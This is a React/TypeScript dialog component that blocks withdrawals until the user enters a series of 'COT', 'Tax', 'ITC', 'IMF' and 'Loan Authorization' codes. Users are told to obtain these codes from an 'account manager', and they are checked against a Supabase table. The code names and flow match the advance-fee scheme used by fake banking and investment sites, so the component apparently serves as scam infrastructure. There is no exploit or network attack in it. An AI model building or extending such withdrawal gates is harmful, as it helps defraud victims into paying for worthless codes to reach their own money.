import { useEffect, useMemo, useState } from "react";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { ShieldCheck, KeyRound, CheckCircle2, XCircle, Loader2 } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/useAuth";

type CodeType = "cot" | "tax" | "imf" | "itc" | "loan";

interface CodeGateProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  required?: CodeType[];
  title?: string;
  description?: string;
  onVerified: (codeIds: string[]) => Promise<void> | void;
}

// `full` is used in the heading as "<full> Code"
const meta: Record<CodeType, { name: string; full: string; desc: string }> = {
  cot: { name: "COT Code", full: "Cost of Transfer", desc: "Enter your Cost of Transfer Code to continue." },
  tax: { name: "Tax Code", full: "Tax", desc: "Enter your Tax Code to continue." },
  itc: { name: "ITC Code", full: "Interbank Transfer", desc: "Enter your Interbank Transfer Code to continue." },
  imf: { name: "IMF Code", full: "International Monetary Fund", desc: "Enter your IMF Authorization Code to continue." },
  loan: { name: "Loan Code", full: "Loan Authorization", desc: "Enter your Loan Authorization Code to continue." },
};

type CodeRow = { id: string; verified: boolean };

export const CodeGate = ({ open, onOpenChange, required, title, description, onVerified }: CodeGateProps) => {
  const { user } = useAuth();
  const [enabledCodes, setEnabledCodes] = useState<CodeType[]>(["cot"]);
  // The user's enabled code rows, keyed by upper-case type (COT, TAX, ...)
  const [rows, setRows] = useState<Record<string, CodeRow>>({});
  const [ready, setReady] = useState(false);
  const [step, setStep] = useState(0);
  const [value, setValue] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [verifiedIds, setVerifiedIds] = useState<string[]>([]);
  const [state, setState] = useState<"idle" | "checking" | "success" | "error">("idle");

  // While a code is being checked (or just verified) the dialog must not be dismissed
  const busy = state === "checking" || state === "success";

  // On open: reset, then load this user's enabled codes (with their verified flag)
  useEffect(() => {
    if (!open) return;
    setStep(0);
    setValue("");
    setError(null);
    setVerifiedIds([]);
    setState("idle");
    setReady(false);

    if (!user) return;
    let cancelled = false;

    (supabase as any)
      .from("withdrawal_codes")
      .select("id, code_type, verified, enabled")
      .eq("user_id", user.id)
      .eq("enabled", true)
      .then(({ data }: any) => {
        if (cancelled) return;
        const byType: Record<string, CodeRow> = {};
        (data ?? []).forEach((d: any) => {
          byType[String(d.code_type).toUpperCase()] = { id: d.id, verified: !!d.verified };
        });

        const list: CodeType[] = ["cot"]; // COT always required
        if (byType.TAX) list.push("tax");
        if (byType.ITC) list.push("itc");
        if (byType.IMF) list.push("imf");

        setRows(byType);
        setEnabledCodes(list);
        setReady(true);
      });

    return () => { cancelled = true; };
  }, [user, open]);

  const computed = useMemo<CodeType[]>(() => {
    if (required && required.length) return required;
    return enabledCodes;
  }, [required, enabledCodes]);

  // Smart start: begin at the first code that isn't verified yet. Codes before it
  // are already verified, so their ids are carried along for onVerified.
  // (When an admin edits a code's value, that row's `verified` must be set back to
  // false so the gate restarts from it. Newly enabled codes default to unverified.)
  useEffect(() => {
    if (!open || !ready) return;
    const firstUnverified = computed.findIndex((t) => !rows[t.toUpperCase()]?.verified);
    const start = firstUnverified === -1 ? 0 : firstUnverified;
    setStep(start);
    setVerifiedIds(
      computed
        .slice(0, start)
        .map((t) => rows[t.toUpperCase()]?.id)
        .filter((id): id is string => !!id)
    );
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [ready, open]);

  const current = computed[step];
  const total = computed.length;

  const verify = async () => {
    if (!user || !current || busy) return;
    const code = value.trim();
    if (!code) { setError("Please enter the code."); setState("error"); return; }
    setState("checking");
    setError(null);

    const { data, error: qErr } = await (supabase as any)
      .from("withdrawal_codes")
      .select("id, verified, enabled")
      .eq("user_id", user.id)
      .eq("code_type", current.toUpperCase())
      .eq("code", code)
      .eq("enabled", true)
      .maybeSingle();

    if (qErr || !data) {
      setState("error");
      setError(`Invalid ${meta[current].name}. Please contact support.`);
      return;
    }

    const next = Array.from(new Set([...verifiedIds, (data as any).id]));
    setVerifiedIds(next);
    setState("success");

    if (step + 1 < total) {
      // More steps: brief pause so the green "Verified" state is visible, then the next code
      setTimeout(() => {
        setStep((s) => s + 1);
        setValue("");
        setError(null);
        setState("idle");
      }, 250);
    } else {
      // Last code: mark everything verified, hand over to the parent, then close
      await (supabase as any)
        .from("withdrawal_codes")
        .update({ verified: true })
        .in("id", next);
      try {
        await onVerified(next);
        onOpenChange(false);
      } catch {
        /* parent handles */
        setState("idle");
      }
    }
  };

  const m = current ? meta[current] : null;

  // Ignore every attempt to dismiss while a code is checking / just verified
  const guard = (e: Event) => {
    if (busy) e.preventDefault();
  };

  return (
    <Dialog
      open={open}
      onOpenChange={(next) => {
        if (!next && busy) return;
        onOpenChange(next);
      }}
    >
      <DialogContent
        className="sm:max-w-md font-sans p-0 overflow-hidden border-0 shadow-2xl rounded-3xl"
        onPointerDownOutside={guard}
        onInteractOutside={guard}
        onEscapeKeyDown={guard}
        onFocusOutside={guard}
      >
        <div className="bg-gradient-to-br from-primary/10 via-background to-accent/5 p-7">
          <DialogHeader>
            <div className="flex items-center gap-2">
              <span className="flex h-9 w-9 items-center justify-center rounded-xl bg-primary/15 ring-1 ring-primary/30">
                <ShieldCheck className="h-5 w-5 text-primary" />
              </span>
              <DialogTitle className="text-base font-bold">{title || "Authorization required"}</DialogTitle>
            </div>
            <p className="mt-2 text-xs text-muted-foreground">
              {description || "Enter the codes provided by your account manager."}
            </p>
          </DialogHeader>

          {!ready && (
            <div className="flex justify-center py-10">
              <Loader2 className="h-6 w-6 animate-spin text-primary" />
            </div>
          )}

          {/* Only show steps if more than 1 code required */}
          {ready && total > 1 && (
            <div className="mt-5">
              <div className="mb-2 flex items-center justify-between text-[11px] font-semibold uppercase tracking-wider text-muted-foreground">
                <span>Step {step + 1} of {total}</span>
                <span>{m?.name}</span>
              </div>
              <div className="flex gap-1.5">
                {computed.map((_, i) => (
                  <div key={i} className={`h-1.5 flex-1 rounded-full transition-all duration-500 ${
                    i < step ? "bg-green-600" : i === step ? "bg-gradient-to-r from-primary to-accent" : "bg-border"
                  }`} />
                ))}
              </div>
            </div>
          )}

          {ready && m && (
            <div key={current} className="mt-6 animate-fade-in space-y-3">
              <div>
                <p className="font-display text-xl font-bold leading-tight">{m.full} Code</p>
                <p className="mt-1 text-xs text-muted-foreground">{m.desc}</p>
              </div>

              <div className={`rounded-2xl border-2 bg-card p-1 transition-all duration-300 ${
                state === "error" ? "border-red-500 shadow-[0_0_0_4px_rgba(239,68,68,0.15)]" :
                state === "success" ? "border-green-600 shadow-[0_0_0_4px_rgba(22,163,74,0.18)]" :
                "border-border focus-within:border-primary focus-within:shadow-[0_0_0_4px_hsl(var(--primary)/0.15)]"
              }`}>
                <Input
                  autoFocus
                  value={value}
                  onChange={(e) => {
                    setValue(e.target.value.toUpperCase());
                    if (error) setError(null);
                    if (state === "error") setState("idle");
                  }}
                  onKeyDown={(e) => { if (e.key === "Enter") verify(); }}
                  placeholder="ENTER CODE"
                  className="h-14 border-0 bg-transparent text-center font-mono text-xl font-bold tracking-[0.35em] shadow-none focus-visible:ring-0"
                  // readOnly (not disabled) so the input keeps focus and the dialog
                  // doesn't treat it as focus leaving the dialog
                  readOnly={busy}
                />
              </div>

              {error && (
                <div className="flex items-center gap-2 rounded-xl bg-red-50 px-3 py-2 text-xs font-medium text-red-700 dark:bg-red-950/40 dark:text-red-300 animate-fade-in">
                  <XCircle className="h-3.5 w-3.5" /> {error}
                </div>
              )}

              <Button
                onClick={verify}
                disabled={busy}
                className="h-12 w-full rounded-2xl bg-gradient-primary text-base font-semibold shadow-glow"
              >
                {state === "checking" ? (
                  <><Loader2 className="mr-2 h-4 w-4 animate-spin" /> Verifying…</>
                ) : state === "success" ? (
                  <><CheckCircle2 className="mr-2 h-4 w-4" /> Verified</>
                ) : (
                  <><KeyRound className="mr-2 h-4 w-4" /> {step + 1 < total ? "Verify & continue" : "Verify & authorize"}</>
                )}
              </Button>
            </div>
          )}
        </div>
      </DialogContent>
    </Dialog>
  );
};
